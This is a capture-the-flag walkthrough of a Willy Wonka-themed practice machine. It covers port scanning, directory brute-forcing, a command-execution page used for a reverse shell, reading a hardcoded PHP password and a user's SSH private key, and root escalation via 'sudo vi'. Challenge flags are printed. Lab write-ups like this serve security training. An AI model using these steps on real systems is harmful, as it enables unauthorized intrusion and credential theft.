## Chocolate Factory

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

---

## Notes

First reconnaissance and port scanning.

```shell
nmap 10.129.132.231
```

```shell
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map
```

We have a bunch of ports open, but let's focus with the most important one, which is 80 (HTTP).

Browsing the URL, we found a login page but we don't have any credentials. So i run `gobuster` to determine the web hidden directories.

```shell
gobuster dir -u "http://10.129.132.231/" -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
home.php             (Status: 200) [Size: 569]
index.html           (Status: 200) [Size: 1466]
```

We found only one hidden directory `home.php`. When we enter the directory we found a page where we can execute shell commands.

```shell
whoami
www-data
```

So we can easily execute a reverse shell and listen for the connection.

```shell
nc -lnvp 2222
```

Then i use http://revshells.com to get a python reverse shell and execute it in the web.

```shell
strings key_rev_key
```

```text
congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

> Enter the key you found!
> 
> b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

```shell
cat validate.php 
```

```php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>
```

> What is Charlie's password?
> 
> cn7824

This password is for the web and don't work in the shell, so we have to find another way to login as user `charlie`.

```shell
ls /home/charlie/
```

```text
teleport  teleport.pub  user.txt
```

That's it we found `teleport`, which is a SSH `id_rsa` that we can copy and use to login as `charlie`.

```shell
cat /home/charlie/teleport
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

```shell
chmod 600 teleport
```

```shell
ssh charlie@10.129.132.231 -i teleport
```

```shell
whoami
charlie
```

> change user to charlie
> 
> No answer needed

```shell
cd /home/charlie/
```

```shell
cat user.txt
```

```text
flag{cd5509042371b34e4826e4838b522d2e}
```

> Enter the user flag
> 
> flag{cd5509042371b34e4826e4838b522d2e}

```shell
sudo -l
```

```text
(ALL : !root) NOPASSWD: /usr/bin/vi
```

Here we use `GTFOBins` to identify how to escalate our privileges.

```shell
sudo vi -c ':!/bin/bash' /dev/null
```

```shell
whoami
root
```

That's it, we successfully become root.

```shell
ls /root/
```

```text
root.py  snap
```

```shell
cat /root/root.py 
```

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

Fernet is a symmetric key encryption algorithm which makes sure that a message encrypted cannot be read without the key. And we already have the key which is: 
`-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`

If you face a problem running the script you can searched for a `Fernet decryptor` like:
https://asecuritysite.com/encryption/ferdecode

Put the message you found in the python file in the `Token` input box, the key in the key input box and click on the `Determine` button.

```text
flag{cec59161d338fef787fcb4e296b42124}
```

> Enter the root flag
> 
> flag{cec59161d338fef787fcb4e296b42124}

